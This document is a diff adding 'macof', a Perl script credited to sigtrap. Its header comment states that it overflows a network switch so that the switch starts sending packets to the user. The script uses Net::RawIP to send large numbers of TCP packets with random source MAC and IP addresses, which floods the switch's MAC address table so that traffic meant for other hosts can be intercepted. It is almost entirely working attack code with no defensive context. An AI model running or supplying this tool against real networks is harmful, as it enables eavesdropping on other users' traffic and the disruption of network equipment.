@@ -1,0 +1,80 @@
+#!/usr/bin/perl -w
+#
+# v. 1.0
+# By sigtrap <ian.vitek@backupcentralen.se>
+# Overflow switch so it starts sending packages to you.
+# Need Net::RawIP (http://www.ic.al.lg.ua/~ksv)
+# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)
+# Example:
+# macof -s <ip_near_you> -e <mac_of_def_gate> -n 1000000
+#
+
+require 'getopts.pl';
+use Net::RawIP;
+Getopts('vrs:e:d:x:y:i:n:');
+$a = new Net::RawIP;
+
+die "usage: $0 -d target_host [options]\
+\t-s source_host\t\t(def:random)\
+\t-v \t\t\tprints generated mac-addresses\
+\t-r | -e dest_mac \trandomize or set destination mac address\
+\t\t\t\tshould be in format ff:ff:ff:ff:ff:ff or host\
+\t-x source_port\t\t(def:random)\
+\t-y dest_port \t\t(def:random)\
+\t-i interface \t\tset sending interface \t\t(def:eth0)\
+\t-n times\t\tset number of times to send \t(def:1000)\n" unless ($opt_d && !($opt_r && $opt_e) );
+
+# set default values
+$opt_i=eth0 unless $opt_i;
+$times=0;
+$opt_n=1000 unless $opt_n;
+$s_host=$opt_s if $opt_s;
+$s_port=$opt_x if $opt_x;
+$d_port=$opt_y if $opt_y;
+
+# choose network card
+if($opt_e) {
+  $a->ethnew($opt_i, dest => $opt_e);
+} else {
+  $a->ethnew($opt_i);
+}
+
+# Loop
+for($times=1; $times < $opt_n; $times++) {
+  $i=0;
+  $mac="00";
+# Check if one or two mac-addresses should be generated
+  if($opt_r) {
+    $d_mac="00";
+#   generate random source and dest mac-addresses
+    while($i++ < 5) {
+      $mac=$mac . ":" . int rand 9;
+      $d_mac=$d_mac . ":" . int rand 9;
+      $mac=$mac . int rand 9;
+      $d_mac=$d_mac . int rand 9;
+    }
+    print "$d_mac \t$mac\n" if($opt_v);
+#   set mac-addresses
+    $a->ethset(source => $mac, dest => $d_mac);
+  } else {
+#   generate random source mac-address
+    while($i++ < 5) {
+      $mac=$mac . ":" . int rand 9;
+      $mac=$mac . int rand 9;
+    }
+    print "$mac\n" if($opt_v);
+#   set mac-address
+    $a->ethset(source => $mac);
+  }
+# generate random source ip-address
+  $s_host=17000000+int rand 4261000000 unless $opt_s;
+# generate random source and dest port
+  $s_port=int rand 65535 unless $opt_x;
+  $d_port=int rand 65535 unless $opt_y;
+# set network package
+  $a->set({ip => {saddr => $s_host, daddr => $opt_d},
+           tcp => {source => $s_port,dest => $d_port}
+          });
+# send
+  $a->ethsend;
+}
